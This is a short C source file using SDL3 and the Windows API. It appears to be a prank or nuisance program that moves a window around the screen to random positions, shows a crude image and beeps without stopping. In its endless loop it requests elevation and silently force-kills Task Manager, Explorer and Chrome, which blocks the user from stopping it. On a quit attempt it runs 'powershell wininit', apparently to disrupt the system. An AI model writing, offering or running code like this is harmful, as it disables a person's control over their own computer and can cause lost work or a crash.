#include <SDL3/SDL.h>
#include <windows.h>

int main() {
  SDL_Window* window;
  SDL_Renderer* renderer;
  SDL_Surface* surface;
  SDL_Texture* texture;

  SDL_CreateWindowAndRenderer(
    "hfdh",
    800,
    600,
    SDL_WINDOW_OPENGL,
    &window,
    &renderer
  );

  surface = SDL_LoadBMP("fuck.bmp");
  texture = SDL_CreateTextureFromSurface(renderer, surface);

  SDL_DestroySurface(surface);

  while(true) {
    SDL_Event event;
    SDL_PollEvent(&event);

    ShellExecute(NULL, "runas", "taskkill", "/f /im taskmgr.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im explorer.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im chrome.exe", NULL, SW_HIDE);

    if (event.type == SDL_EVENT_QUIT) {
      system("powershell wininit");
    }

    SDL_SetWindowPosition(window, rand() % 1920, rand() % 1080);

    MessageBeep(0xFFFFFFFF);

    SDL_SetRenderDrawColor(renderer, 0, 0, 0, 0);
    SDL_RenderClear(renderer);
    SDL_RenderTexture(renderer, texture, NULL, NULL);
    SDL_RenderPresent(renderer);
  }

  SDL_DestroyTexture(texture);
  SDL_DestroyRenderer(renderer);
  SDL_DestroyWindow(window);
  SDL_Quit();

  return 0;
}